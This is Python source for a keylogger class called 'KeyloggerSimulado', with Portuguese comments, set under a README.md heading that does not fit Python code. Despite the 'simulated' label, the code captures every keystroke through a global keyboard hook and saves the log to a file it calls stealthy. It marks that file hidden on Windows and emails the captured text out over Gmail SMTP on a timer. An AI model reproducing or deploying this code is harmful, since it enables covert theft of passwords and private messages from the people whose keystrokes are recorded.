# -README.md

import keyboard
import smtplib
from email.mime.text import MimeText
from email.mime.multipart import MimeMultipart
import threading
import time
import os
from datetime import datetime

class KeyloggerSimulado:
    def __init__(self, intervalo_relatorio=60, email=None, senha=None):
        self.intervalo = intervalo_relatorio
        self.log = ""
        self.executando = False
        self.email = email
        self.senha = senha
        self.arquivo_log = "system_log.txt"
        
    def callback(self, event):
        """Captura cada tecla pressionada"""
        nome = event.name
        
        if len(nome) > 1:
            # Teclas especiais
            if nome == "space":
                nome = " "
            elif nome == "enter":
                nome = "[ENTER]\n"
            elif nome == "decimal":
                nome = "."
            else:
                nome = f"[{nome.upper()}]"
        
        self.log += nome
    
    def enviar_email(self, mensagem):
        """Envia logs por email (configuração necessária)"""
        if not self.email or not self.senha:
            print("[-] Configuração de email não fornecida")
            return False
            
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.senha)
            
            msg = MimeMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = f"Keylogger Report - {datetime.now()}"
            
            msg.attach(MimeText(mensagem, 'plain'))
            
            server.send_message(msg)
            server.quit()
            
            print("[+] Log enviado por email com sucesso")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao enviar email: {e}")
            return False
    
    def salvar_log_arquivo(self):
        """Salva logs em arquivo local de forma furtiva"""
        try:
            with open(self.arquivo_log, "a", encoding="utf-8") as f:
                f.write(f"\n\n=== Sessão {datetime.now()} ===\n")
                f.write(self.log)
            
            print(f"[+] Log salvo em {self.arquivo_log}")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao salvar log: {e}")
            return False
    
    def reportar(self):
        """Relatório periódico dos logs capturados"""
        if self.log:
            # Salva em arquivo
            self.salvar_log_arquivo()
            
            # Envia por email se configurado
            if self.email:
                self.enviar_email(self.log)
            
            # Limpa o log para a próxima captura
            self.log = ""
        
        if self.executando:
            threading.Timer(self.intervalo, self.reportar).start()
    
    def ocultar_arquivo(self):
        """Tenta ocultar o arquivo de log (Windows)"""
        try:
            # No Windows, adiciona atributo oculto
            os.system(f"attrib +h {self.arquivo_log}")
            print("[+] Arquivo de log ocultado")
        except:
            pass
    
    def iniciar(self):
        """Inicia o keylogger"""
        print("[+] Iniciando keylogger simulado...")
        self.executando = True
        
        # Configura o hook do teclado
        keyboard.on_release(callback=self.callback)
        
        # Inicia relatórios periódicos
        self.reportar()
        
        # Tenta ocultar o arquivo
        self.ocultar_arquivo()
        
        print("[+] Keylogger ativo. Pressione ESC para parar.")
        
        # Aguarda comando para parar
        keyboard.wait('esc')
        self.parar()
    
    def parar(self):
        """Para o keylogger"""
        self.executando = False
        keyboard.unhook_all()
        
        # Salva logs finais
        if self.log:
            self.salvar_log_arquivo()
        
        print("[+] Keylogger parado")

